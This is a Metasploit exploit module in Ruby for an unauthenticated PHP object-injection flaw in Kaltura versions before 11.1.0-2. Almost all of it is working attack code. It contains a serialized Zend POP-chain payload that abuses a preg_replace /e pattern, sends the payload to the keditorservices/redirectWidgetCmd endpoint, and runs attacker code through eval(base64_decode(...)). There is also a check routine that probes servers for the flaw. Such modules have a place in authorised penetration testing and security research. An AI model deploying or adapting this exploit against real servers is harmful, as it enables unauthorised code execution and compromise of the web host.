# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Kaltura Remote PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an Object Injection vulnerability in Kaltura.
        By exploiting this vulnerability, unauthenticated users can execute
        arbitrary code under the context of the web server user.
 
        Kaltura has a module named keditorservices that takes user input
        and then uses it as an unserialized function parameter. The constructed
        object is based on the SektionEins Zend code execution POP chain PoC,
        with a minor modification to ensure Kaltura processes it and the
        Zend_Log function&#039;s __destruct() method is called. Kaltura versions
        prior to 11.1.0-2 are affected by this issue.
 
        This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Security-Assessment.com&#039;,             # discovery
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039;  # msf module
        ],
      &#039;References&#039;      =>
        [
          [&#039;EDB&#039;, &#039;39563&#039;]
        ],
      &#039;Privileged&#039;      => false,
      &#039;Platform&#039;        => [&#039;php&#039;],
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039;  => &#039;Mar 15 2016&#039;,
      &#039;DefaultTarget&#039;   => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The target URI of the Kaltura installation&#039;, &#039;/&#039;])
      ]
    )
  end
 
  def check
    r = rand_text_alpha(15 + rand(4))
    cmd = "print_r(#{r}).die()"
 
    p = ""
    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"
 
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php/keditorservices/redirectWidgetCmd&#039;),
      &#039;vars_get&#039; => {
        &#039;kdata&#039; => Rex::Text.encode_base64(p)
      }
    )
 
    if res && res.body.include?(r)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    cmd = "print_r(eval(base64_decode(&#039;#{Rex::Text.encode_base64(payload.encode)}&#039;))).die()"
 
    p = ""
    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"
 
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php/keditorservices/redirectWidgetCmd&#039;),
      &#039;vars_get&#039; => {
        &#039;kdata&#039; => Rex::Text.encode_base64(p)
      }
    )
  end
end

